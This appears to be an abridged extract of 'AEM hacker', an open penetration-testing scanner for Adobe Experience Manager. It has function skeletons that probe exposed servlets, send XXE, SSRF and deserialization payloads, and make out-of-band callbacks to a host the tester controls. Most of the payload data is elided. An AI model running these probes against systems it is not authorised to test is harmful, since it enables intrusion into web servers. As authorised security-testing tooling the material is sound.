# Extracted from: C:\DEV\PyAgent\.external\aem-hacker\aem_hacker.py
import argparse
import base64
...
def http_request_multipart(
    url, method="POST", data=None, additional_headers=None, proxy=None, debug=False
):
    headers = {"User-Agent": "curl/7.30.0"}
    if additional_headers:
        headers.update(additional_headers)
...
def exposed_set_preferences(base_url, my_host, debug=False, proxy=None):
    ...
    SETPREFERENCES = list(
        "{0}{1}{2}".format(p1, p2.format(r), p3) for p1, p2, p3 in SETPREFERENCES
    )
...
def exposed_merge_metadata(base_url, my_host, debug=False, proxy=None):
    ...
    MERGEMETADATA = list(
        "{0}{1}{2}".format(p1, p2.format(r), p3) for p1, p2, p3 in MERGEMETADATA
    )
...
def exposed_get_servlet(base_url, my_host, debug=False, proxy=None):
    ...
    GETSERVLET = list(
        "{0}{1}{2}".format(p1, p2, p3.format(r)) for p1, p2, p3 in GETSERVLET
    )
    ...
    for path in QUERYBUILDER:
        ...
        try:
            ...
            if debug:
                error(
                    "Exception while performing a check",
                    check="exposed_querybuilder_servlet",
                    url=url,
                )
...
def exposed_gql_servlet(base_url, my_host, debug=False, proxy=None):
    ...
    GQLSERVLET = list(
        "{0}{1}{2}".format(p1, p2.format(r), p3) for p1, p2, p3 in GQLSERVLET
    )
...
def exposed_guide_internal_submit_servlet_xxe(
    base_url, my_host, debug=False, proxy=None
):
    r = random_string(3)
    ...
    GuideInternalSubmitServlet = list(
        "{0}{1}".format(p1, p2.format(r)) for p1, p2 in GuideInternalSubmitServlet
    )
    ...
    for path in GuideInternalSubmitServlet:
        ...
        try:
            ...
            if debug:
                error(
                    "Exception while performing a check",
                    check="exposed_guide_internal_submit_servlet_xxe",
                    url=url,
                )
...
def exposed_post_servlet(base_url, my_host, debug=False, proxy=None):
    ...
    for path in POSTSERVLET:
        ...
        try:
            ...
            if resp.status_code == 200 and "Null Operation Status:" in str(
                resp.content
            ):
                f = Finding(
                    "POSTServlet",
...
def create_new_nodes(base_url, my_host, debug=False, proxy=None):
    ...
    POSTSERVLET1 = list(
        "{0}{1}".format(p1, p2.format(nodename1, r1)) for p1, p2 in POSTSERVLET1
    )
    ...
    POSTSERVLET2 = list(
        "{0}{1}".format(p1, p2.format(nodename2, r2)) for p1, p2 in POSTSERVLET2
    )
    ...
    for path in POSTSERVLET1:
        ...
        try:
            ...
            if "<td>Parent Location</td>" in str(resp.content) and resp.status_code in [
                200,
                201,
            ]:
                f = Finding(
...
def create_new_nodes2(base_url, my_host, debug=False, proxy=None):
    ...
    POSTSERVLET = list(
        "{0}{1}".format(p1, p2.format(nodename, r)) for p1, p2 in POSTSERVLET
    )
    ...
    for path in LOGINSTATUS:
        ...
        try:
            ...
            if debug:
                error(
                    "Exception while performing a check",
                    check="exposed_loginstatus_servlet",
                    url=url,
                )
    ...
    for path in CURRENTUSER:
        ...
        try:
            ...
            if debug:
                error(
                    "Exception while performing a check",
                    check="exposed_currentuser_servlet",
                    url=url,
                )
    ...
    for path in USERINFO:
        ...
        try:
            ...
            if debug:
                error(
                    "Exception while performing a check",
                    check="exposed_userinfo_servlet",
                    url=url,
                )
    ...
    for path in WCMDEBUG:
        ...
        try:
            ...
            if (
                ...
                and "res=" in str(resp.content)
                and "sel=" in str(resp.content)
            ):
                f = Finding(
                    "WCMDebugFilter",
                    url,
...
def exposed_wcmsuggestions_servlet(base_url, my_host, debug=False, proxy=None):
    ...
    WCMSUGGESTIONS = list(
        "{0}{1}{2}".format(p1, p2.format(r), p3) for p1, p2, p3 in WCMSUGGESTIONS
    )
    ...
    for path in WCMSUGGESTIONS:
        ...
        try:
            ...
            if debug:
                error(
                    "Exception while performing a check",
                    check="exposed_wcmsuggestions_servlet",
                    url=url,
                )
        ...
        try:
            ...
            if resp.status_code == 200 and (
                ...
                f = Finding(
                    "CRXDE Lite/CRX",
                    url,
                    "Sensitive information might be exposed. Check manually.",
                )
...
def ssrf_salesforcesecret_servlet(base_url, my_host, debug=False, proxy=None):
    ...
    SALESFORCESERVLET2 = list(
        pair[0].format(pair[1].format(cache_buster)) for pair in SALESFORCESERVLET2
    )
    ...
    SALESFORCESERVLET3 = list(
        pair[0].format(pair[1].format(cache_buster)) for pair in SALESFORCESERVLET3
    )

    for path in itertools.chain(
        SALESFORCESERVLET1, SALESFORCESERVLET2, SALESFORCESERVLET3
    ):
        url = normalize_url(base_url, path)
        encoded_orig_url = (base64.b16encode(url.encode())).decode()
        back_url = "http://{0}/{1}/salesforcesecret/{2}/".format(
        ...
        try:
            ...
            if debug:
                error(
                    "Exception while performing a check",
                    check="ssrf_salesforcesecret_servlet",
                    url=url,
                )
...
def ssrf_reportingservices_servlet(base_url, my_host, debug=False, proxy=None):
    ...
    cache_buster = random_string()
    REPOSTINGSERVICESSERVLET2 = (
        path.format(cache_buster) for path in REPOSTINGSERVICESSERVLET2
    )
    ...
    REPOSTINGSERVICESSERVLET3 = (
        path.format(cache_buster) for path in REPOSTINGSERVICESSERVLET3
    )

    for path in itertools.chain(
        REPOSTINGSERVICESSERVLET1, REPOSTINGSERVICESSERVLET2, REPOSTINGSERVICESSERVLET3
    ):
        url = normalize_url(base_url, path)
        encoded_orig_url = (base64.b16encode(url.encode())).decode()
        back_url = "http://{0}/{1}/reportingservices/{2}/".format(
            my_host, token, encoded_orig_url
        )
        url = url.format(back_url)
        ...
        try:
            ...
            if debug:
                error(
                    "Exception while performing a check",
                    check="ssrf_reportingservices_servlet",
                    url=url,
                )
...
def ssrf_sitecatalyst_servlet(base_url, my_host, debug=False, proxy=None):
    ...
    for path in itertools.chain(SITECATALYST1, SITECATALYST2, SITECATALYST3):
        url = normalize_url(base_url, path)
        encoded_orig_url = (base64.b16encode(url.encode())).decode()
        back_url = "http://{0}/{1}/sitecatalyst/{2}/".format(
            my_host, token, encoded_orig_url
        )
        url = url.format(back_url)
        ...
        try:
            ...
            if debug:
                error(
                    "Exception while performing a check",
                    check="ssrf_sitecatalyst_servlet",
                    url=url,
                )
...
def ssrf_autoprovisioning_servlet(base_url, my_host, debug=False, proxy=None):
    ...
    cache_buster = random_string()
    AUTOPROVISIONING2 = list(
        "{0}{1}".format(p1, p2.format(cache_buster)) for p1, p2 in AUTOPROVISIONING2
    )
    ...
    cache_buster = randint(1, 2**12)
    AUTOPROVISIONING3 = list(
        "{0}{1}".format(p1, p2.format(cache_buster)) for p1, p2 in AUTOPROVISIONING3
    )

    for path in itertools.chain(
        AUTOPROVISIONING1, AUTOPROVISIONING2, AUTOPROVISIONING3
    ):
        url = normalize_url(base_url, path)
        enc_orig_url = (base64.b16encode(url.encode())).decode()
        back_url = "http://{0}/{1}/autoprovisioning/{2}/".format(
            my_host, token, enc_orig_url
        )
        ...
        try:
            ...
            if debug:
                error(
                    "Exception while performing a check",
                    check="ssrf_autoprovisioning_servlet",
                    url=url,
                )
...
def ssrf_opensocial_proxy(base_url, my_host, debug=False, proxy=None):
    ...
    cache_buster = random_string()
    OPENSOCIAL2 = list(
        pair[0].format(pair[1].format(cache_buster)) for pair in OPENSOCIAL2
    )
    ...
    cache_buster = randint(1, 2**12)
    OPENSOCIAL3 = list(
        pair[0].format(pair[1].format(cache_buster)) for pair in OPENSOCIAL3
    )

    for path in itertools.chain(OPENSOCIAL1, OPENSOCIAL2, OPENSOCIAL3):
        url = normalize_url(base_url, path)
        encoded_orig_url = (base64.b16encode(url.encode())).decode()
        back_url = "http://{0}/{1}/opensocial/{2}/".format(
            my_host, token, encoded_orig_url
        )
        url = url.format(back_url)
...
def ssrf_opensocial_makeRequest(base_url, my_host, debug=False, proxy=None):
    ...
    cache_buster = random_string()
    MAKEREQUEST2 = list(
        pair[0].format(pair[1].format(cache_buster)) for pair in MAKEREQUEST2
    )
    ...
    cache_buster = randint(1, 2**12)
    MAKEREQUEST3 = list(
        pair[0].format(pair[1].format(cache_buster)) for pair in MAKEREQUEST3
    )

    for path in itertools.chain(MAKEREQUEST1, MAKEREQUEST2, MAKEREQUEST3):
        url = normalize_url(base_url, path)
        encoded_orig_url = (base64.b16encode(url.encode())).decode()
        back_url = "http://{0}/{1}/opensocialmakerequest/{2}/".format(
            my_host, token, encoded_orig_url
        )
        url = url.format(back_url)
        ...
        try:
            ...
            if debug:
                error(
                    "Exception while performing a check",
                    check="ssrf_opensocial_makeRequest",
                    url=url,
                )
...
def deser_externaljob_servlet(base_url, my_host, debug=False, proxy=None):
    ...
    EXTERNALJOBSERVLET = list(
        "{0}{1}".format(p1, p2.format(r)) for p1, p2 in EXTERNALJOBSERVLET
    )
    ...
    for path in EXTERNALJOBSERVLET:
        ...
        data = {
            ":operation": ("", "job"),
            "file": ("jobevent", DESERPAYLOAD, "application/octet-stream"),
        }
        headers = {"Referer": base_url}
        try:
            resp = http_request_multipart(
                url, data=data, additional_headers=headers, proxy=proxy, debug=debug
            )
            ...
            if debug:
                error(
                    "Exception while performing a check",
                    check="deser_externaljob_servlet",
                    url=url,
                )
    ...
    for path in itertools.chain(GROOVYSCRIPT1, GROOVYSCRIPT2):
        ...
        try:
            ...
            f = Finding(
                "GroovyConsole",
                url,
                "Groovy console is exposed, RCE is possible. "
        ...
        try:
            ...
            if resp.status_code == 200 and "abcdef31337" in str(resp.content):
                f = Finding(
                    "ACSTools",
                    url,
                    "ACS Tools Fiddle is exposed, RCE is possible. "
...
def parse_args():
    parser = argparse.ArgumentParser(
        description="AEM hacker by @0ang3el, see the slides - https://speakerdeck.com/0ang3el/hunting-for-security-bugs-in-aem-webapps"
    )
    ...
    parser.add_argument(
        "--port", type=int, default=80, help="opens port for SSRF detection"
    )
    parser.add_argument(
        "--workers", type=int, default=3, help="number of parallel workers"
    )
    parser.add_argument(
        "-H", "--header", nargs="*", help="extra http headers to attach"
    )
    parser.add_argument(
        "--handler",
        action="append",
        help="run specific handlers, if omitted run all handlers",
    )
    parser.add_argument(
        "--listhandlers", action="store_true", help="list available handlers"
    )
